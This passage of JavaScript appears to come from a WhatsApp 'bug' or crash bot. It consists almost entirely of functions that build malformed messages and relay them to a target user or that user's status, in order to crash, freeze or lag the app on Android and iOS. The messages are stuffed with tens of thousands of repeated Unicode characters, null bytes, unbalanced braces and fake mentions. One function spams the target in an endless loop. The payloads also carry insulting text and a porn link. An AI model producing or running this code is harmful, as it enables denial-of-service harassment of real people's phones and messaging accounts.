                    ),
                  ],
                  remoteJid: "X",
                  participant:
                    Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  stanzaId: "123",
                  quotedMessage: {
                    paymentInviteMessage: {
                      serviceType: 3,
                      expiryTimestamp: Date.now() + 1814400000,
                    },
                    forwardedAiBotMessageInfo: {
                      botName: "META AI",
                      botJid:
                        Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                      creatorName: "Bot",
                    },
                  },
                },
              },
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, zieeMsg, { userJid: target });
    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id,
    });
  } catch (err) {
    console.error(err);
  }
}
async function mikirKidz(sock, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await sock.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG TERKIRIM");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}

async function TesFcNgabs(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
        extendedTextMessage: {
          text: 
          "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + 
          "https://Wa.me/stickerpack/VaxzyCoreX.my.id",
          contextInfo: {
           participant: target,
            mentionedJid: [target],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
           stanzaId: "123",
           quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
              }
            },
            externalAdReply: {
              renderLargerThumbnail: true,
              thumbnailUrl: "https://wa.me/stickerpack/VaxzyCoreX",
              sourceUrl: "https://wa.me/stickerpack/VaxzyCoreX",
              showAdAttribution: true,
              body: "you are in idiot bro",
              title: "i will wana die",
            }
          },
        },
      },
    },
  }, {});
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

// Delay function
async function locationX(target) {
console.log("locationX Attack");

    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    name: "RilzX7",
                    address: "\u0000",
                    contextInfo: {
                        mentionedJid: [
                            isTarget,
                            ...Array.from({ length: 40000 }, () =>
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: target
    });
}

async function CarouselLolipop(target) {
    try {
        while (true) {
            const cards = Array.from({ length: 1000 }, () => ({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: "Lolipop" }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "Permen Gula" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: '$'.repeat(20000),
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
                        mimetype: "image/jpeg",
                        fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                        fileLength: "10840",
                        height: 10,
                        width: 10,
                        mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                        fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                        directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
                        mediaKeyTimestamp: "1721344123",
                        jpegThumbnail: ""
                    }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
            }));

            const xata = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

            const carousel = generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ 
                                    text: `Mau Permen Ngga \n${"𑜦".repeat(1000)}:)\n\u0000` 
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ 
                                    text: "www.webapixata.com" 
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({ 
                                    hasMediaAttachment: false 
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                                    cards: cards 
                                }),
                                contextInfo: {
                                    mentionedJid: [
                                        target,
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 1900 }, () => 
                                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                        ),
                                    ],
                                    remoteJid: target,
                                    participant: xata,
                                    stanzaId: "1234567890ABCDEF"
                                }
                            })
                        }
                    }
                },
                { userJid: target }
            );

            await sock.relayMessage(target, carousel.message, {
                messageId: carousel.key.id,
                participant: { jid: target }
            });
            console.log(
                chalk.redBright.bold("[🔥 BUG SENT 🔥]") + " " +
                chalk.greenBright("Target: ") + chalk.yellow(target) + " " +
                chalk.cyan("MessageID: ") + chalk.magenta(carousel.key.id)
            );

            // kasih jeda biar ga langsung spam terlalu cepat
            await sleep(2000); 
        }
    } catch (err) {
        console.error(chalk.bgRed("Error sending carousel:"), err);
        return { 
            status: "error", 
            error: err.message,
            stack: err.stack 
        };
    }
}
 
async function crashclick(sock, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
        fileLength: "9999999999999",
        height: 9999,
        width: 9999,
        mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
        fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
        directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1755254367",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAB..."
    };

    const contextInfo = {
        participant: target,
        mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
        ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
            paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
            }
        }
    };

    const Interactive = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo,
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: { hasMediaAttachment: true, imageMessage },
                            body: { text: "⎋𝐀𝐌𝐄𝐋𝐈𝐀-‣" + "\u0000".repeat(5000) },
                            nativeFlowMessage: {
                                buttons: Array.from({ length: 10 }, () => ([
                                    { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_open_native_flow", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_send_location", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_send_payment", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_share_app", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_reminder", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) },
                                    { name: "cta_join_group", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3500) }) }
                                ])).flat(),
                                messageParamsJson: "{".repeat(10000)
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, Interactive, {
        messageId: null,
        userJid: target
    });
}

async function BulldoIngpis(sock, target) {
  try {
    const m =
      "᬴᬴᬴".repeat(15000) +
      "꧔꧈".repeat(15000) +
      "ꦽ".repeat(20000);

    const massage = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: m,
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: m,
                    address: m,
                  },
                },
                body: {
                  text:
                    "༑ᐧ ✧ 𝙴𝚡𝚕𝚞𝚜𝚒𝚘𝚗 ✧ ༑" +
                    "꧔꧈".repeat(2000),
                },
                contextInfo: {
                  participant: target,
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () =>
                      "1" +
                      Math.floor(Math.random() * 5000000) +
                      "@s.whatsapp.net"
                    ),
                  ],
                  remoteJid: "X",
                  participant:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  stanzaId: "123",
                  quotedMessage: {
                    paymentInviteMessage: {
                      serviceType: 3,
                      expiryTimestamp:
                        Date.now() + 1814400000,
                    },
                    forwardedAiBotMessageInfo: {
                      botName: "META AI",
                      botJid:
                        Math.floor(Math.random() * 5000000) +
                        "@s.whatsapp.net",
                      creatorName: "Bot",
                    },
                  },
                },
              },
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, massage,{ userJid: target });
    await sock.relayMessage(target, msg.message, {
     participant: { jid: target },
     messageId: msg.key.id
     });
  console.log(chalk.red(`1MB SEDANG MELAYANG KE ${target}`));
  } catch (err) {
    console.error(err);
  }
}

//Ios
async function makloios(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘",
        matchedText: "https://Wa.me/stickerpack/AllTheFeels",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function ioss(target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/ShyKala",
      extendedTextMessage: {
      text: "ꦾ".repeat(20000) + "@1".repeat(20000),
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@ameliamodders" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  }
};
  
  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  console.log(chalk.red(`Succes Sending Bug CrashIos`));
}

async function NewIos(sock, target) {
  await sock.sendMessage(target, {
    text: "‼⃟⃟ ҈⃝⃞⃟⃠⃤𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘 ‼⃟⃟ ҈⃝⃞⃟⃠⃤",
    contextInfo: {
      externalAdReply: {
        title: "({[ ./𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘 ]})" + "𑇂𑆵𑆴𑆿".repeat(15000),
        body: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "PHOTO",
        remoteJid: " X ",
        conversionSource: " X ",
        conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
        conversionDelaySeconds: 10,
        forwardingScore: 9999999,
        isForwarded: true,
        quotedAd: {
          advertiserName: " X ",
          mediaType: "IMAGE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
          caption: " X "
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
        thumbnail: null,
        sourceUrl: "https://xnxx.com" + "𑇂𑆵𑆴𑆿".repeat(15000),
      }
    }
  });
}
//Notif Attack

async function MakLoItam(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c&mms3=true",
              directPath: "/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c",
              mimetype: "image/jpeg",
              mediaKey: "2fXXmVelp53Ffz5tv7J0UJyEmUEoFbfpeGcgG21zKk4=",
              fileEncSha256: "I/6MTYL3oRDBI3dPez/v6V0Meq90dRerYyhWJF0PYDw=",
              fileSha256: "ExVmZkmvhmJRraU4undM/3Zcz80Ju46UkTWd2eRWMX8=",
              fileLength: "46031",
              mediaKeyTimestamp: "1755963474"
            }
          },
          body: {
            text: "༑ᐧ ✧ 𝙴𝚡𝚕𝚞𝚜𝚒𝚘𝚗 ✧ ༑" + "ꦾ".repeat(30000), 
          },
          footer: {
            text: "༑ᐧ ✧ 𝙴𝚡𝚕𝚞𝚜𝚒𝚘𝚗 ✧ ༑" + "ꦽ".repeat(10000), 
          },
          nativeFlowMessage: {
            messageParamsJson: ")}".repeat(5000), 
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true }) 
              },
              { 
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) 
              }
            ],
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(message), { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  console.log(chalk.red(`ABCDEFGHI TO ${target}`));
}

async function UiImage(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z"
            }
          },
          body: {
            text: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" + "ꦾ".repeat(30000), 
          },
          footer: {
            text: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" + "ꦽ".repeat(10000), 
          },
          nativeFlowMessage: {
           messageParamsJson: ")}".repeat(5000), 
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: "".repeat(2000), 
            
              },
              {
                name: "payment_info",
                buttonParamsJson: "ꦽ".repeat(2000),
              },
              {
                name: "cta_url",
                buttonParamsJson: "https://" + "ꦾ".repeat(7000), 
              }
            ],
          }
        }
      }
    }
  };
const msg = generateWAMessageFromContent(target, proto.Message.fromObject(message), { userJid: target });
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  console.log(chalk.red(`Succes Sending Bug To ${target}`));
}

async function BlankUi(target) {
const MemekMelar = "ꦽ".repeat(4500);
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꈍᴗꈍ",
            hasMediaAttachment: false
          },
          body: {
            text: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" + MemekMelar
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(2000) + "[".repeat(1234),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: MemekMelar
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: MemekMelar
              }
            ]
          }
        }
      }
    }
  };

    await sock.relayMessage(target, msg, {
   messageId: null,
    participant: { jid: target }
  });
}
async function urlNew(sock, target) {
  await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name:
              "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" +
              "ꦽ".repeat(45000),
            address: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘‌‌",
            url:
              "https://kayla.imut🩸" +
              "؂ن؃".repeat(100000) +
              ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: " X ",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}
//Func Blank Freze Click
async function NewUIBetaNew(target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "ោ៝".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" + "ꦾ".repeat(2500),
      caption: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘៝"+ "ꦾ".repeat(2000),
      body: {
        text:
          "ᴋᴀʏʟᴀ ᴇᴍᴘᴇʀᴏʀ" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
      nativeFlowResponseMessage: {
        name: 'address_message',
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"atzcore\",\"landmark_area\":\"X\",\"address\":\"𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘\",\"tower_number\":\"dvx\",\"city\":\"markzuckerberg\",\"name\":\"caywz\",\"phone_number\":\"999999999999\",\"house_number\":\"dvx\",\"floor_number\":\"dvx\",\"state\":\"X${"\x10".repeat(900000)}\"}}`,
        version: 3
                }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function blanksimple(target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "ោ៝".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘" + "ꦾ".repeat(2500),
      caption: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘៝"+ "ꦾ".repeat(2000),
      body: {
        text:
          "ᴋᴀʏʟᴀ ᴇᴍᴘᴇʀᴏʀ" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
  };
  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}
//New Delay
async function Delayamel(sock, target) {
const messageContent = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘".repeat(10000),
          contextInfo: {
            mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random()*5000000) + "@s.whatsapp.net")
        ],
            externalAdReply: {
              title: "amel",
              body: "tel:+6281933605296",
              mediaUrl: "tel:+6281933605296",
              thumbnailUrl: "tel:+6281933605296",
              sourceUrl: "tel:+6281933605296",
              renderLargerThumbnail: true,
              showAdAttribution: true
            }
          }
        }
      }
    }
  };
  const xrlMsg   = generateWAMessageFromContent(target, messageContent, {});
  
  await sock.relayMessage("status@broadcast", xrlMsg.message, {
    messageId: xrlMsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  }
async function amelDelayy(sock, target) {
  const message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        eventMessage: {
          isCanceled: false,
          name: "𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘",
          description: " 𝗣𝗛𝗢𝗡𝗜𝗫 𝗜𝗡𝗩𝗜𝗧𝗨𝗦 𝗜𝗦 𝗛𝗘𝗥𝗘` ",
          location: {
            degreesLatitude: "a",
            degreesLongitude: "a",
            name: "X"
          },
          joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
          startTime: "1714957200",
          thumbnailDirectPath: "https://aloneatlast.xyz/thumb.jpg",
          thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
          thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
          mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
          mediaKeyTimestamp: Date.now(),
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "6281933605296@s.whatsapp.net",
            fromMe: false,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "🦠",
                  format: "EXTENSIONS_1"
                },
                nativeFlowResponseMessage: {
                  name: 'address_message',
